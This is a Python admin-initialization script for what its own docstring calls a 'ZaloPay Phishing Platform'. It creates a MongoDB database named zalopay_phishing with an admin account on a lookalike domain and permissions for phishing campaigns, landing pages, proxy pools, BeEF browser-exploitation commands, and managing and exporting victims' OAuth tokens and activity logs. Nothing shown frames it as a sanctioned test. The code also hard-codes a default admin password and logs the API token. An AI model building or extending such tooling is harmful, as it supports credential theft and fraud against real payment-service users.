"""
Admin User Initialization for ZaloPay Phishing Platform
Creates default admin user and sets up initial permissions
"""

import asyncio
import logging
from datetime import datetime, timezone
from typing import Dict, Any

from argon2 import PasswordHasher
from pymongo import MongoClient
from pymongo.errors import DuplicateKeyError, OperationFailure

logger = logging.getLogger(__name__)

class AdminUserInitializer:
    """Initialize admin users and permissions"""
    
    def __init__(self, mongodb_uri: str):
        self.mongodb_uri = mongodb_uri
        self.client = None
        self.db = None
        self.password_hasher = PasswordHasher()
    
    async def initialize(self):
        """Initialize admin user"""
        try:
            # Connect to MongoDB
            await self._connect_to_mongodb()
            
            # Create admin user
            await self._create_admin_user()
            
            # Create default permissions
            await self._create_default_permissions()
            
            # Create API tokens
            await self._create_api_tokens()
            
            logger.info("Admin user initialization completed successfully")
            
        except Exception as e:
            logger.error(f"Failed to initialize admin user: {e}")
            raise
        finally:
            if self.client:
                self.client.close()
    
    async def _connect_to_mongodb(self):
        """Connect to MongoDB"""
        try:
            self.client = MongoClient(self.mongodb_uri)
            self.db = self.client.zalopay_phishing
            
            # Test connection
            self.client.admin.command('ping')
            logger.info("Connected to MongoDB successfully")
            
        except Exception as e:
            logger.error(f"Failed to connect to MongoDB: {e}")
            raise
    
    async def _create_admin_user(self):
        """Create default admin user"""
        try:
            admin_user = {
                "username": "admin",
                "email": "admin@zalopaymerchan.com",
                "password_hash": self.password_hasher.hash("Admin@ZaloPay2025!"),
                "role": "admin",
                "permissions": [
                    "user_management",
                    "campaign_management", 
                    "victim_management",
                    "proxy_management",
                    "beef_management",
                    "system_settings",
                    "analytics_view",
                    "log_view"
                ],
                "is_active": True,
                "is_verified": True,
                "two_factor_enabled": False,
                "last_login": None,
                "login_attempts": 0,
                "locked_until": None,
                "created_at": datetime.now(timezone.utc),
                "updated_at": datetime.now(timezone.utc),
                "created_by": "system",
                "notes": "Default admin user created during system initialization"
            }
            
            # Check if admin user already exists
            existing_user = self.db.admin_users.find_one({"username": "admin"})
            if existing_user:
                logger.info("Admin user already exists, skipping creation")
                return
            
            # Create admin user
            result = self.db.admin_users.insert_one(admin_user)
            logger.info(f"Admin user created with ID: {result.inserted_id}")
            
        except DuplicateKeyError:
            logger.info("Admin user already exists")
        except Exception as e:
            logger.error(f"Failed to create admin user: {e}")
            raise
    
    async def _create_default_permissions(self):
        """Create default permission templates"""
        try:
            permissions = [
                {
                    "name": "user_management",
                    "description": "Manage admin users and permissions",
                    "actions": ["create", "read", "update", "delete"],
                    "resources": ["admin_users", "permissions"],
                    "created_at": datetime.now(timezone.utc)
                },
                {
                    "name": "campaign_management",
                    "description": "Manage phishing campaigns",
                    "actions": ["create", "read", "update", "delete", "execute"],
                    "resources": ["campaigns", "landing_pages"],
                    "created_at": datetime.now(timezone.utc)
                },
                {
                    "name": "victim_management",
                    "description": "Manage victim data and sessions",
                    "actions": ["read", "update", "delete", "export"],
                    "resources": ["victims", "oauth_tokens", "activity_logs"],
                    "created_at": datetime.now(timezone.utc)
                },
                {
                    "name": "proxy_management",
                    "description": "Manage proxy pool and configurations",
                    "actions": ["create", "read", "update", "delete", "test"],
                    "resources": ["proxies", "proxy_configs"],
                    "created_at": datetime.now(timezone.utc)
                },
                {
                    "name": "beef_management",
                    "description": "Manage BeEF framework and browser exploitation",
                    "actions": ["read", "execute", "monitor"],
                    "resources": ["beef_sessions", "beef_commands"],
                    "created_at": datetime.now(timezone.utc)
                },
                {
                    "name": "system_settings",
                    "description": "Manage system configuration and settings",
                    "actions": ["read", "update"],
                    "resources": ["system_config", "security_settings"],
                    "created_at": datetime.now(timezone.utc)
                },
                {
                    "name": "analytics_view",
                    "description": "View analytics and reports",
                    "actions": ["read"],
                    "resources": ["analytics", "reports", "statistics"],
                    "created_at": datetime.now(timezone.utc)
                },
                {
                    "name": "log_view",
                    "description": "View system logs and audit trails",
                    "actions": ["read"],
                    "resources": ["logs", "audit_trails"],
                    "created_at": datetime.now(timezone.utc)
                }
            ]
            
            # Insert permissions if they don't exist
            for permission in permissions:
                existing = self.db.permissions.find_one({"name": permission["name"]})
                if not existing:
                    self.db.permissions.insert_one(permission)
                    logger.info(f"Created permission: {permission['name']}")
            
            logger.info("Default permissions created successfully")
            
        except Exception as e:
            logger.error(f"Failed to create default permissions: {e}")
            raise
    
    async def _create_api_tokens(self):
        """Create API tokens for admin user"""
        try:
            import secrets
            
            # Generate API token
            api_token = secrets.token_urlsafe(32)
            
            token_doc = {
                "user_id": "admin",
                "token": api_token,
                "name": "Default Admin API Token",
                "permissions": [
                    "user_management",
                    "campaign_management",
                    "victim_management",
                    "proxy_management",
                    "beef_management",
                    "system_settings",
                    "analytics_view",
                    "log_view"
                ],
                "is_active": True,
                "expires_at": None,  # Never expires
                "last_used": None,
                "usage_count": 0,
                "created_at": datetime.now(timezone.utc),
                "created_by": "system",
                "notes": "Default API token for admin user"
            }
            
            # Check if token already exists
            existing_token = self.db.api_tokens.find_one({"user_id": "admin"})
            if existing_token:
                logger.info("API token already exists for admin user")
                return
            
            # Create API token
            result = self.db.api_tokens.insert_one(token_doc)
            logger.info(f"API token created with ID: {result.inserted_id}")
            logger.info(f"Admin API Token: {api_token}")
            
        except Exception as e:
            logger.error(f"Failed to create API token: {e}")
            raise
    
    async def create_custom_admin_user(self, username: str, email: str, password: str, 
                                     role: str = "admin", permissions: list = None):
        """Create a custom admin user"""
        try:
            if permissions is None:
                permissions = [
                    "user_management",
                    "campaign_management",
                    "victim_management",
                    "proxy_management",
                    "beef_management",
                    "system_settings",
                    "analytics_view",
                    "log_view"
                ]
            
            admin_user = {
                "username": username,
                "email": email,
                "password_hash": self.password_hasher.hash(password),
                "role": role,
                "permissions": permissions,
                "is_active": True,
                "is_verified": True,
                "two_factor_enabled": False,
                "last_login": None,
                "login_attempts": 0,
                "locked_until": None,
                "created_at": datetime.now(timezone.utc),
                "updated_at": datetime.now(timezone.utc),
                "created_by": "admin",
                "notes": f"Custom admin user created by admin"
            }
            
            # Check if user already exists
            existing_user = self.db.admin_users.find_one({"username": username})
            if existing_user:
                raise ValueError(f"User with username '{username}' already exists")
            
            existing_email = self.db.admin_users.find_one({"email": email})
            if existing_email:
                raise ValueError(f"User with email '{email}' already exists")
            
            # Create user
            result = self.db.admin_users.insert_one(admin_user)
            logger.info(f"Custom admin user '{username}' created with ID: {result.inserted_id}")
            
            return str(result.inserted_id)
            
        except Exception as e:
            logger.error(f"Failed to create custom admin user: {e}")
            raise
    
    async def update_admin_password(self, username: str, new_password: str):
        """Update admin user password"""
        try:
            password_hash = self.password_hasher.hash(new_password)
            
            result = self.db.admin_users.update_one(
                {"username": username},
                {
                    "$set": {
                        "password_hash": password_hash,
                        "updated_at": datetime.now(timezone.utc)
                    }
                }
            )
            
            if result.modified_count > 0:
                logger.info(f"Password updated for user '{username}'")
            else:
                logger.warning(f"User '{username}' not found")
            
        except Exception as e:
            logger.error(f"Failed to update password for user '{username}': {e}")
            raise
    
    async def verify_admin_user(self, username: str, password: str) -> bool:
        """Verify admin user credentials"""
        try:
            user = self.db.admin_users.find_one({"username": username})
            if not user:
                return False
            
            if not user.get("is_active", False):
                logger.warning(f"User '{username}' is not active")
                return False
            
            if user.get("locked_until") and user["locked_until"] > datetime.now(timezone.utc):
                logger.warning(f"User '{username}' is locked until {user['locked_until']}")
                return False
            
            # Verify password
            try:
                self.password_hasher.verify(user["password_hash"], password)
                
                # Update last login
                self.db.admin_users.update_one(
                    {"username": username},
                    {
                        "$set": {
                            "last_login": datetime.now(timezone.utc),
                            "login_attempts": 0
                        }
                    }
                )
                
                return True
                
            except Exception:
                # Increment login attempts
                self.db.admin_users.update_one(
                    {"username": username},
                    {
                        "$inc": {"login_attempts": 1}
                    }
                )
                
                # Lock user after 5 failed attempts
                user = self.db.admin_users.find_one({"username": username})
                if user.get("login_attempts", 0) >= 5:
                    lock_until = datetime.now(timezone.utc).replace(hour=23, minute=59, second=59)
                    self.db.admin_users.update_one(
                        {"username": username},
                        {"$set": {"locked_until": lock_until}}
                    )
                    logger.warning(f"User '{username}' locked due to too many failed login attempts")
                
                return False
            
        except Exception as e:
            logger.error(f"Failed to verify user '{username}': {e}")
            return False

# Convenience functions
async def initialize_admin_user(mongodb_uri: str):
    """Initialize admin user"""
    initializer = AdminUserInitializer(mongodb_uri)
    await initializer.initialize()

async def create_admin_user(mongodb_uri: str, username: str, email: str, password: str):
    """Create a new admin user"""
    initializer = AdminUserInitializer(mongodb_uri)
    await initializer._connect_to_mongodb()
    try:
        return await initializer.create_custom_admin_user(username, email, password)
    finally:
        if initializer.client:
            initializer.client.close()

async def verify_user_credentials(mongodb_uri: str, username: str, password: str) -> bool:
    """Verify user credentials"""
    initializer = AdminUserInitializer(mongodb_uri)
    await initializer._connect_to_mongodb()
    try:
        return await initializer.verify_admin_user(username, password)
    finally:
        if initializer.client:
            initializer.client.close()

# CLI interface
if __name__ == "__main__":
    import sys
    import os
    
    # Setup logging
    logging.basicConfig(level=logging.INFO)
    
    # Get MongoDB URI from environment
    mongodb_uri = os.getenv("MONGODB_URI", "mongodb://localhost:27017")
    
    if len(sys.argv) > 1:
        command = sys.argv[1]
        
        if command == "init":
            # Initialize default admin user
            asyncio.run(initialize_admin_user(mongodb_uri))
            
        elif command == "create":
            # Create custom admin user
            if len(sys.argv) < 5:
                print("Usage: python init_admin.py create <username> <email> <password>")
                sys.exit(1)
            
            username = sys.argv[2]
            email = sys.argv[3]
            password = sys.argv[4]
            
            asyncio.run(create_admin_user(mongodb_uri, username, email, password))
            
        elif command == "verify":
            # Verify user credentials
            if len(sys.argv) < 4:
                print("Usage: python init_admin.py verify <username> <password>")
                sys.exit(1)
            
            username = sys.argv[2]
            password = sys.argv[3]
            
            result = asyncio.run(verify_user_credentials(mongodb_uri, username, password))
            print(f"Verification result: {result}")
            
        else:
            print("Unknown command. Available commands: init, create, verify")
            sys.exit(1)
    else:
        print("Usage: python init_admin.py <command>")
        print("Commands:")
        print("  init                    - Initialize default admin user")
        print("  create <user> <email> <pass> - Create custom admin user")
        print("  verify <user> <pass>    - Verify user credentials")
        sys.exit(1)
